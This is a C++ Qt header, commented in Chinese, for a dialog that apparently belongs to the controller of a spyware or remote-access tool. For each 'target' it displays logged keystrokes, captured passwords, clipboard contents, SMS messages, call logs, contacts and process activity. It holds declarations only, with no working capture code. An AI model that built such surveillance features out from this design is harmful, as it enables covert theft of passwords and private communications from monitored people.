#ifndef USERACTIONDLG_H
#define USERACTIONDLG_H

#include <QWidget>
#include <QTimer>

#include "ui_useractiondlg.h"

#include <Windows.h>

class Target;
class WaitDlg;

class UserActionDlg : public QWidget
{
	Q_OBJECT

public:
	UserActionDlg(QWidget *parent, Target* tar);
	~UserActionDlg();

public:
	void GetNewPluginData(MSG* msg);

signals:

	// 更新通话记录，查询归属地很费时间，故发送信号
	void emitCallInfo(unsigned int targetId, QTableWidget* table);

	// 键盘记录
	void emitKeyboardInfo(unsigned int targetId, PageTableWidget* table);

public slots:
	void onQueryKeyboardInfoFinished(unsigned int tarId);

private:
	void InitUserAction();
	void InitConnection();
	void InitWidgetAppearance();

private slots:

	// 定时刷新数据
	void RefreshUserActionData();

	// 点击左侧用户行为列表
	void onTrUserActionItemClicked(QTreeWidgetItem* item, int column);

	// 点击键盘记录列表中的某一项
	void onTbKeyboardRecordItemClicked(QTableWidgetItem* item);

	// 点击密码记录列表中的某一项
	void onTbPasswordRecordItemClicked(QTableWidgetItem* item);

	// 点击剪贴板记录列表中的某一项
	void onTbClipboardDataItemClicked(QTableWidgetItem* item);

	// 点击短信记录列表中的某一项
	void onTbMessageInfoItemClicked(QTableWidgetItem* item);

private:

	// 初始化右侧各个列表
	void InitUserActionData();

	// 刷新用户文件行为
	void RefreshUserFOIData();

	// 刷新键盘记录
	void RefreshIMEData();

	// 刷新密码记录
	void RefreshPWIData();

	// 刷新剪贴板记录
	void RefreshCBDData();

	// 刷新进程文件访问记录
	void RefreshFOIData();

	// 刷新进程执行轨迹记录
	void RefreshPEIData();

	// 刷新短信记录
	void RefreshSMSData();

	// 刷新通话记录
	void RefreshCALData();

	// 刷新通讯录
	void RefreshCONTACTData();

	void InsertIMEData(
		LONG time, 
		const std::wstring& proc, 
		int procId, 
		const std::wstring& caption, 
		const std::wstring& content);

	void InsertSMSData(
		LONG type,
		const std::wstring& address,
		const std::wstring& message,
		const std::wstring& date);

	void InsertCALData(
		LONG type,
		const std::wstring& address,
		const std::wstring& date,
		int duration);

	void InsertCONTACTData(
		const std::wstring& name,
		const std::wstring& phone,
		const std::wstring& remark);

private:
	Ui::UserActionDlg ui;
	Target* m_tar;

	WaitDlg* m_waitKeyboardInfoDlg;
	bool m_queryKeyboardInfoFinished;

	QTimer m_refreshTimer;

	// 新建 | 复制 | 剪切 ...
	CHAR opType[MAX_PATH];
};

#endif // USERACTIONDLG_H
